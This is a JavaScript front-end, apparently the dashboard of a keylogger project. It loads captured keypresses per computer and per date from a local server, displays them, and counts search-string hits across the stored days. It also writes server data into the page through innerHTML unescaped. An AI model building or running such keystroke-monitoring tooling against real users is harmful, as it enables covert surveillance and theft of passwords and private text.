// document.addEventListener('DOMContentLoaded', function () {
//     const mainContent = document.querySelector('.main-content');
//     mainContent.style.visibility = 'hidden';
//     mainContent.style.opacity = '0';
//     const path = document.querySelector("#animated-svg path");

//     if (path) {
//         gsap.set(path, { strokeDasharray: 2000, strokeDashoffset: 2000 });

//         gsap.to(path, {
//             strokeDashoffset: 0,
//             duration: 6, // האטנו ל-6 שניות
//             ease: "power1.inOut"
//         });

//         gsap.fromTo(".logo-name", 
//             { y: 50, opacity: 0 },
//             { y: 0, opacity: 1, duration: 2, delay: 0 } // יופיע אחרי חצי מהציור
//         );

//         gsap.to(".loading-page", {
//             opacity: 0,
//             duration: 1.5,
//             delay: 3, // הדף יוצג אחרי - שניות (נותן יותר זמן)
//             onComplete: () => {
//                 document.querySelector('.loading-page').style.display = 'none';
//                 mainContent.style.visibility = 'visible';
//                 mainContent.style.opacity = '1';
//                 fetchReceivedData();
//             }
//         });
//     }

     
// });


// //מחזיר את הרשימת מחשבים

// async function getComputers() {
//     try {
//         let response = await fetch("http://127.0.0.1:5000/computers");
//         if (!response.ok) {
//             throw new Error("Server error: " + response.status);
//         }
//         let computers = await response.json();
//         populateDropdown(computers);
//     } catch (error) {
//         console.error("Error fetching data:", error);
//     }
// }

// function populateDropdown(computers) {
//     let select = document.getElementById("computer");
//     select.innerHTML = ""; // מנקה את הרשימה לפני הוספת נתונים חדשים

//     computers.forEach(computer => {
//         let option = document.createElement("option");
//         option.value = computer;
//         option.textContent = computer;
//         select.appendChild(option);
//     });
// }

// document.addEventListener("DOMContentLoaded", getComputers);


// // קבועים גלובליים
// const API_BASE_URL = 'http://127.0.0.1:5000/api';
// const ELEMENTS = {
//     computer: document.getElementById("computer"),
//     searchInput: document.getElementById("inp"),
//     result: document.getElementById("result"),
//     resultData: document.getElementById("result-data"),
//     date: document.getElementById("date"),
//     follower: document.getElementById("Follo"),
//     startButton: document.getElementById("start"),
//     startButtonText: document.getElementById("text-start-button"),
//     circle: document.querySelector(".sircle-card"),
//     animation: document.getElementById("animation"),
//     modalButton: document.querySelector('.show-button'),
//     modalBlock: document.querySelector('.block'),
//     modalOverlay: document.querySelector('.overlay'),
//     modalCloseButton: document.querySelector('.close-button')
// };

// // פונקציות עזר
// function countStringInJSON(jsonData, searchStr) {
//     if (!jsonData || !jsonData.keypresses || !Array.isArray(jsonData.keypresses) || !searchStr) return 0;
    
//     let count = 0;
//     const lowerSearch = searchStr.toLowerCase();

//     jsonData.keypresses.forEach(item => {
//         if (item.key) {
//             const keyValue = item.key.toString().toLowerCase();
//             count += keyValue.split(lowerSearch).length - 1;
//         }
//     });

//     return count;
// }

// function updateComputerName() {
//     if (ELEMENTS.computer && ELEMENTS.follower) {
//         ELEMENTS.follower.textContent = ELEMENTS.computer.value;
//     }
// }

// // פונקציות API
// async function fetchComputers() {
//     try {
//         const response = await fetch(`${API_BASE_URL}/computers`);
//         if (!response.ok) {
//             throw new Error('שגיאה בטעינת רשימת המחשבים');
//         }
//         return await response.json();
//     } catch (error) {
//         console.error('שגיאה בטעינת רשימת המחשבים:', error);
//         throw error;
//     }
// }

// async function fetchAndCountForComputer(computer, searchStr) {
//     let totalCount = 0;
//     try {
//         const listResponse = await fetch(`${API_BASE_URL}/computers/${computer}`);
//         if (!listResponse.ok) {
//             throw new Error(`שגיאה בטעינת רשימת התאריכים עבור ${computer}`);
//         }
//         const dates = await listResponse.json();
        
//         if (!Array.isArray(dates)) {
//             throw new Error("המבנה של רשימת התאריכים לא תואם את הציפיות");
//         }
        
//         for (const date of dates) {
//             try {
//                 const dayResponse = await fetch(`${API_BASE_URL}/computers/${computer}/${date}`);
//                 if (!dayResponse.ok) {
//                     console.error(`שגיאה בטעינת הנתונים עבור היום ${date}: ${dayResponse.status}`);
//                     continue;
//                 }
//                 const dayData = await dayResponse.json();
//                 totalCount += countStringInJSON(dayData, searchStr);
//             } catch (dayError) {
//                 console.error(`שגיאה בעיבוד הנתונים עבור היום ${date}:`, dayError);
//             }
//         }
//     } catch (error) {
//         console.error("שגיאה בטעינת רשימת התאריכים:", error);
//         throw error;
//     }
//     return totalCount;
// }

// async function fetchDayData(computer, day) {
//     const response = await fetch(`${API_BASE_URL}/computers/${computer}/${day}`);
//     if (!response.ok) {
//         throw new Error(`HTTP error! status: ${response.status}`);
//     }
//     return response.json();
// }

// // פונקציות UI
// async function loadComputerOptions() {
//     try {
//         const computers = await fetchComputers();
//         const selectElement = ELEMENTS.computer;
        
//         if (!selectElement) {
//             console.error('אלמנט ה-select לא נמצא');
//             return;
//         }

//         // ניקוי אופציות קיימות
//         selectElement.innerHTML = '';
        
//         // הוספת האופציות החדשות
//         computers.forEach(computerName => {
//             const option = document.createElement('option');
//             option.value = computerName;
//             option.textContent = computerName;
//             option.className = 'cyber-text-glow';
//             selectElement.appendChild(option);
//         });

//         // עדכון שם המחשב הנבחר
//         updateComputerName();
//     } catch (error) {
//         console.error('שגיאה בטעינת אפשרויות המחשבים:', error);
//     }
// }

// async function handleSearch() {
//     if (!ELEMENTS.computer || !ELEMENTS.searchInput || !ELEMENTS.result) {
//         console.error("אחד מהאלמנטים לא נמצא");
//         return;
//     }

//     const computer = ELEMENTS.computer.value;
//     const searchStr = ELEMENTS.searchInput.value;

//     try {
//         const totalCount = await fetchAndCountForComputer(computer, searchStr);
//         ELEMENTS.result.innerHTML = totalCount;
//     } catch (error) {
//         ELEMENTS.result.innerHTML = "שגיאה בטעינת הנתונים";
//     }
// }

// function handleStartButtonClick() {
//     const { startButtonText, circle, animation } = ELEMENTS;
//     const isStarting = startButtonText.innerHTML === "start";

    
//     startButtonText.innerHTML = isStarting ? "stop" : "start";
//     startButtonText.style.color = isStarting ? "#ff3914" : "#39ff14";
    
//     animation.style.visibility = isStarting ? "visible" : "hidden";
    
//     const circleStyles = isStarting ? {
//         border: "1px solid #ff1414",
//         boxShadow: "0 0 10px #ff1414",
//         hoverShadow: "0 0 20px #ff1414, 0 0 40px #ff3914"
//     } : {
//         border: "1px solid var(--neon-blue)",
//         boxShadow: "0 0 10px var(--neon-blue)",
//         hoverShadow: "0 0 20px var(--neon-blue), 0 0 40px var(--neon-green)"
//     };
    
//     circle.style.border = circleStyles.border;
//     circle.style.boxShadow = circleStyles.boxShadow;
//     document.documentElement.style.setProperty('--shine-color', 
//         isStarting ? 'rgba(255, 20, 20, 0.2)' : 'rgba(0, 243, 255, 0.2)');
    
//     circle.addEventListener('mouseenter', () => circle.style.boxShadow = circleStyles.hoverShadow);
//     circle.addEventListener('mouseleave', () => circle.style.boxShadow = circleStyles.boxShadow);
// }

// async function handleFormSubmit(event) {
//     event.preventDefault();
//     const computer = ELEMENTS.computer.value;
//     const day = ELEMENTS.date.value;
    
//     updateComputerName();
    
//     try {
//         const data = await fetchDayData(computer, day);
//         ELEMENTS.resultData.innerHTML = "<pre>" + JSON.stringify(data, null, 4) + "</pre>";
//     } catch (error) {
//         console.error('Error:', error);
//     }
// }

// // טיפול במודל
// function showModal() {
//     document.body.classList.add('modal-open');
//     ELEMENTS.modalBlock.classList.add('show');
//     ELEMENTS.modalOverlay.classList.add('show');
//     ELEMENTS.modalButton.style.display = 'none';
// }

// function hideModal() {
//     document.body.classList.remove('modal-open');
//     ELEMENTS.modalBlock.classList.remove('show');
//     ELEMENTS.modalOverlay.classList.remove('show');
//     ELEMENTS.modalButton.style.display = 'block';
// }

// // הגדרת event listeners
// function initializeEventListeners() {
//     ELEMENTS.startButton?.addEventListener('click', handleStartButtonClick);
//     ELEMENTS.modalButton?.addEventListener('click', showModal);
//     ELEMENTS.modalCloseButton?.addEventListener('click', hideModal);
//     ELEMENTS.modalOverlay?.addEventListener('click', hideModal);
// }

// // אתחול
// async function initialize() {
//     await loadComputerOptions();  // טעינת רשימת המחשבים
//     initializeEventListeners();
// }

// // הפעלת האתחול כשהדף נטען
// document.addEventListener('DOMContentLoaded', initialize);



document.addEventListener('DOMContentLoaded', function () {
    const mainContent = document.querySelector('.main-content');
    mainContent.style.visibility = 'hidden';
    mainContent.style.opacity = '0';
    const path = document.querySelector("#animated-svg path");

    if (path) {
        gsap.set(path, { strokeDasharray: 2000, strokeDashoffset: 2000 });

        gsap.to(path, {
            strokeDashoffset: 0,
            duration: 6,
            ease: "power1.inOut"
        });

        gsap.fromTo(".logo-name", 
            { y: 50, opacity: 0 },
            { y: 0, opacity: 1, duration: 2, delay: 0 }
        );

        gsap.to(".loading-page", {
            opacity: 0,
            duration: 1.5,
            delay: 3,
            onComplete: () => {
                document.querySelector('.loading-page').style.display = 'none';
                mainContent.style.visibility = 'visible';
                mainContent.style.opacity = '1';
                initialize(); // Call initialize after loading animation
            }
        });
    } else {
        // If SVG path not found, still initialize the app
        initialize();
    }
});

// Fetch list of computers from the server
async function getComputers() {
    try {
        const response = await fetch("http://127.0.0.1:5000/computers");
        if (!response.ok) {
            throw new Error("Server error: " + response.status);
        }
        const computers = await response.json();
        return computers;
    } catch (error) {
        console.error("Error fetching computers:", error);
        return [];
    }
}

// Populate dropdown with computer names
function populateDropdown(computers) {
    const select = document.getElementById("computer");
    if (!select) return;
    
    select.innerHTML = ""; // Clear list before adding new data

    computers.forEach(computer => {
        const option = document.createElement("option");
        option.value = computer;
        option.textContent = computer;
        select.appendChild(option);
    });
    
    // Update the follower text with selected computer name
    updateComputerName();
}

// Global elements object
const ELEMENTS = {
    computer: document.getElementById("computer"),
    searchInput: document.getElementById("inp"),
    result: document.getElementById("result"),
    resultData: document.getElementById("result-data"),
    date: document.getElementById("date"),
    follower: document.getElementById("Follo"),
    startButton: document.getElementById("start"),
    startButtonText: document.getElementById("text-start-button"),
    circle: document.querySelector(".sircle-card"),
    animation: document.getElementById("animation"),
    modalBlock: document.querySelector('.block'),
    modalOverlay: document.querySelector('.overlay'),
    modalCloseButton: document.querySelector('.close-button')
};

// Count occurrences of a string in the keypress data
function countStringInJSON(jsonData, searchStr) {
    if (!jsonData || !jsonData.keypresses || !Array.isArray(jsonData.keypresses) || !searchStr) return 0;
    
    let count = 0;
    const lowerSearch = searchStr.toLowerCase();

    jsonData.keypresses.forEach(item => {
        if (item.key) {
            const keyValue = item.key.toString().toLowerCase();
            count += keyValue.split(lowerSearch).length - 1;
        }
    });

    return count;
}

// Update computer name display
function updateComputerName() {
    if (ELEMENTS.computer && ELEMENTS.follower) {
        ELEMENTS.follower.textContent = ELEMENTS.computer.value || "None";
    }
}

// Search for a string in the data
async function handleSearch() {
    if (!ELEMENTS.computer || !ELEMENTS.searchInput || !ELEMENTS.result) {
        console.error("Required elements not found");
        return;
    }

    const computer = ELEMENTS.computer.value;
    const searchStr = ELEMENTS.searchInput.value;

    if (!computer || !searchStr) {
        ELEMENTS.result.innerHTML = "0";
        return;
    }

    try {
        const totalCount = await fetchAndCountForComputer(computer, searchStr);
        ELEMENTS.result.innerHTML = totalCount;
    } catch (error) {
        console.error("Error searching:", error);
        ELEMENTS.result.innerHTML = "Error";
    }
}

// Fetch data for a specific computer and count occurrences
async function fetchAndCountForComputer(computer, searchStr) {
    let totalCount = 0;
    try {
        // Get list of dates for the computer
        const datesResponse = await fetch(`http://127.0.0.1:5000/api/computers/${computer}`);
        if (!datesResponse.ok) {
            throw new Error(`Error loading dates for ${computer}: ${datesResponse.status}`);
        }
        const dates = await datesResponse.json();
        
        if (!Array.isArray(dates)) {
            throw new Error("Dates list format not as expected");
        }
        
        // For each date, fetch the data and count occurrences
        for (const date of dates) {
            try {
                const dayResponse = await fetch(`http://127.0.0.1:5000/api/computers/${computer}/${date}`);
                if (!dayResponse.ok) {
                    console.error(`Error loading data for date ${date}: ${dayResponse.status}`);
                    continue;
                }
                const dayData = await dayResponse.json();
                totalCount += countStringInJSON(dayData, searchStr);
            } catch (dayError) {
                console.error(`Error processing data for date ${date}:`, dayError);
            }
        }
    } catch (error) {
        console.error("Error loading dates list:", error);
        throw error;
    }
    return totalCount;
}

// Fetch data for a specific day
async function fetchDayData(computer, day) {
    const response = await fetch(`http://127.0.0.1:5000/api/computers/${computer}/${day}`);
    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
}

// Toggle start/stop button
function handleStartButtonClick() {
    const { startButtonText, circle, animation } = ELEMENTS;
    const isStarting = startButtonText.innerHTML === "start";

    startButtonText.innerHTML = isStarting ? "stop" : "start";
    startButtonText.style.color = isStarting ? "#ff3914" : "#39ff14";
    
    animation.style.visibility = isStarting ? "visible" : "hidden";
    
    const circleStyles = isStarting ? {
        border: "1px solid #ff1414",
        boxShadow: "0 0 10px #ff1414",
        hoverShadow: "0 0 20px #ff1414, 0 0 40px #ff3914"
    } : {
        border: "1px solid var(--neon-blue)",
        boxShadow: "0 0 10px var(--neon-blue)",
        hoverShadow: "0 0 20px var(--neon-blue), 0 0 40px var(--neon-green)"
    };
    
    circle.style.border = circleStyles.border;
    circle.style.boxShadow = circleStyles.boxShadow;
    document.documentElement.style.setProperty('--shine-color', 
        isStarting ? 'rgba(255, 20, 20, 0.2)' : 'rgba(0, 243, 255, 0.2)');
    
    circle.addEventListener('mouseenter', () => circle.style.boxShadow = circleStyles.hoverShadow);
    circle.addEventListener('mouseleave', () => circle.style.boxShadow = circleStyles.boxShadow);
}

// Handle form submission to fetch day data

    // Handle form submission to fetch day data
async function handleFormSubmit(event) {
    event.preventDefault();
    
    const computer = ELEMENTS.computer.value;
    const day = ELEMENTS.date.value;
    
    if (!computer || !day) {
        alert("Please select both a computer and a date");
        return;
    }
    
    updateComputerName();
    
    try {
        const data = await fetchDayData(computer, day);
        if (ELEMENTS.resultData) {
            // Create a modified copy of the data without sensitive information
            const displayData = { ...data };
            
            // Remove the computer name and date if they exist in the data
            delete displayData.computer;
            delete displayData.date;
            
            ELEMENTS.resultData.innerHTML = `<button class="close-button" onclick="hideModal()">×</button>
                                            <div class="content">
                                              <pre>${JSON.stringify(displayData, null, 4)}</pre>
                                            </div>`;
        }
    } catch (error) {
        console.error('Error:', error);
        if (ELEMENTS.resultData) {
            ELEMENTS.resultData.innerHTML = `<button class="close-button" onclick="hideModal()">×</button>
                                            <div class="content">
                                              <p>Error loading data: ${error.message}</p>
                                            </div>`;
        }
    }
}

// Show modal with data
function showModal() {
    document.body.classList.add('modal-open');
    if (ELEMENTS.modalBlock) ELEMENTS.modalBlock.classList.add('show');
    if (ELEMENTS.modalOverlay) ELEMENTS.modalOverlay.classList.add('show');
}

// Hide modal
function hideModal() {
    document.body.classList.remove('modal-open');
    if (ELEMENTS.modalBlock) ELEMENTS.modalBlock.classList.remove('show');
    if (ELEMENTS.modalOverlay) ELEMENTS.modalOverlay.classList.remove('show');
}

// Load computers and set up event listeners
async function initialize() {
    try {
        const computers = await getComputers();
        populateDropdown(computers);
        
        // Set current date as default
        if (ELEMENTS.date) {
            const today = new Date();
            const year = today.getFullYear();
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const day = String(today.getDate()).padStart(2, '0');
            ELEMENTS.date.value = `${year}-${month}-${day}`;
        }
        
        // Set up event listeners
        if (ELEMENTS.startButton) {
            ELEMENTS.startButton.addEventListener('click', handleStartButtonClick);
        }
        
        if (document.getElementById('btn')) {
            document.getElementById('btn').addEventListener('click', handleSearch);
        }
        
        // Set up modal event listeners
        if (document.querySelector('.show-button')) {
            document.querySelector('.show-button').addEventListener('click', showModal);
        }
        
        if (ELEMENTS.modalCloseButton) {
            ELEMENTS.modalCloseButton.addEventListener('click', hideModal);
        }
        
        if (ELEMENTS.modalOverlay) {
            ELEMENTS.modalOverlay.addEventListener('click', hideModal);
        }
        
    } catch (error) {
        console.error("Error during initialization:", error);
    }
}

// Make functions available globally
window.handleSearch = handleSearch;
window.handleFormSubmit = handleFormSubmit;
window.showModal = showModal;
window.hideModal = hideModal;